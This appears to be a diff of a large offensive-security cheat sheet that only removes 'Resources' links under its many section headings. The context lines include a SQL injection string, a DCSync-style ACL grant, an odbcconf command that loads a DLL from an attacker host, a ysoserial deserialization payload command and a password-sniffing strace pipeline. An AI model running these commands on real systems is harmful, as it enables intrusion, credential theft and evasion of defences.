@@ -2,7 +2,6 @@
 
 # Information Gathering
 
-- [Resources](#resources)
 
 ## Table of Contents
 
@@ -617,7 +616,6 @@ $ tcpdump -envi <INTERFACE> host <RHOST> -s0 -w /PATH/TO/FILE/<FILE>.pcap
 
 # Vulnerability Analysis
 
-- [Resources](#resources)
 
 ## Table of Contents
 
@@ -884,7 +882,6 @@ http.html_hash:"611100469"
 
 # Web Application Analysis
 
-- [Resources](#resources)
 
 ## Table of Contents
 
@@ -5217,7 +5214,6 @@ xmlhttp.send(null);
 
 # Database Assessment
 
-- [Resources](#resources)
 
 ## Table of Contents
 
@@ -6418,7 +6414,6 @@ test' or 1=2 or 'a'='a
 
 # Password Attacks
 
-- [Resources](#resources)
 
 ## Table of Contents
 
@@ -7105,7 +7100,6 @@ irb: warn: can't alias jobs from irb_jobs.
 
 # Wireless Attacks
 
-- [Resources](#resources)
 
 ## Table of Contents
 
@@ -7226,7 +7220,6 @@ $ sudo airmon-ng stop wlan0mon
 
 # Reverse Engineering
 
-- [Resources](#resources)
 
 ## Table of Contents
 
@@ -7551,7 +7544,6 @@ $ upx -d <FILE>
 
 # Exploitation Tools
 
-- [Resources](#resources)
 
 ## Table of Contents
 
@@ -7996,7 +7988,6 @@ $ searchsploit -x <ID> / <PATH>
 
 # Sniffing & Spoofing
 
-- [Resources](#resources)
 
 ## Table of Contents
 
@@ -8085,7 +8076,6 @@ $ tshark -i <INTERFACE> -Y 'smtp.data.fragments' -T fields -e 'text'
 
 # Post Exploitation
 
-- [Resources](#resources)
 
 ## Table of Contents
 
@@ -12286,7 +12276,6 @@ PS C:\> Add-ObjectACL -PrincipalIdentity <USERNAME> -Credential $Cred -Rights DC
 
 # Forensics
 
-- [Resources](#resources)
 
 ## Table of Contents
 
@@ -12699,7 +12688,6 @@ $ zsteg -E <FILE>    // extracts data from the given payload (example : zsteg -E
 
 # Reporting Tools
 
-- [Resources](#resources)
 
 ## Table of Contents
 
@@ -12910,7 +12898,6 @@ msf> spool <file>.log
 
 # Social Engineering Tools
 
-- [Resources](#resources)
 
 ## Table of Contents
 
@@ -13069,7 +13056,6 @@ $ swaks --to <EMAIL> --from <EMAIL> --server <RHOST> --port 25 --body <FILE>.txt
 
 # AI
 
-- [Resources](#resources)
 
 ## Table of Contents
 
@@ -13089,7 +13075,6 @@ $ swaks --to <EMAIL> --from <EMAIL> --server <RHOST> --port 25 --body <FILE>.txt
 
 # Basics
 
-- [Resources](#resources)
 
 ## Table of Contents
 
@@ -18617,7 +18602,6 @@ $ zipgrep password <FILE>.jar
 
 # Blue Teaming
 
-- [Resources](#resources)
 
 ## Table of Contents
 
@@ -18945,7 +18929,6 @@ $ strace -e trace=read -p <PID> 2>&1 | while read x; do echo "$x" | grep '^read.
 
 # Cloud
 
-- [Resources](#resources)
 
 ## Table of Contents
 
@@ -19074,7 +19057,6 @@ $ ruby lazys3.rb <DOMAIN>
 
 # Command and Control
 
-- [Resources](#resources)
 
 ## Table of Contents
 
@@ -19575,7 +19557,6 @@ sliver (NEARBY_LANGUAGE) > pivots
 
 # Container
 
-- [Resources](#resources)
 
 ## Table of Contents
 
@@ -20071,7 +20052,6 @@ $ lxc exec ignite /bin/sh
 
 # Cryptography
 
-- [Resources](#resources)
 
 ## Table of Contents
 
@@ -20424,7 +20404,6 @@ ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f
 # CVE
 
 - [Exploit Databases](#exploit-databases)
-- [Resources](#resources)
 
 ## Table of Contents
 
@@ -22011,7 +21990,6 @@ $ cc -Wall -std=c99 -O2 shocker.c -static
 
 # Evasion Handbook
 
-- [Resources](#resources)
 
 ## Table of Contents
 
@@ -22422,7 +22400,6 @@ PS C:\> odbcconf /s /a {regsvr \\<LHOST>\<FILE>_dll.txt}
 
 # Exploitation
 
-- [Resources](#resources)
 
 ## Table of Contents
 
@@ -23108,7 +23085,6 @@ $
 
 # Hardware
 
-- [Resources](#resources)
 
 ## Table of Contents
 
@@ -23148,7 +23124,6 @@ $ rtl_433 -r <FILE>.cf32 -A
 
 # IoT
 
-- [Resources](#resources)
 
 ## Table of Contents
 
@@ -23230,7 +23205,6 @@ $ $credential.GetNetworkCredential().Password                          // show i
 
 # Malware Development
 
-- [Resources](#resources)
 
 ## Table of Contents
 
@@ -23760,7 +23734,6 @@ C:\> tasklist | findstr /i mssense.exe
 
 # OSINT
 
-- [Resources](#resources)
 
 ## Table of Contents
 
@@ -23964,7 +23937,6 @@ $ theHarvester -d <DOMAIN> -l 500 -b google -f myresults.html
 
 # Payloads
 
-- [Resources](#resources)
 
 ## Table of Contents
 
@@ -24958,7 +24930,6 @@ $ wine ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "<COMMAND>" 
 
 # Privacy
 
-- [Resources](#resources)
 
 ## Table of Contents
 
@@ -25512,7 +25483,6 @@ finally:
 
 # Wordlists
 
-- [Resources](#resources)
 
 ## Table of Contents
 
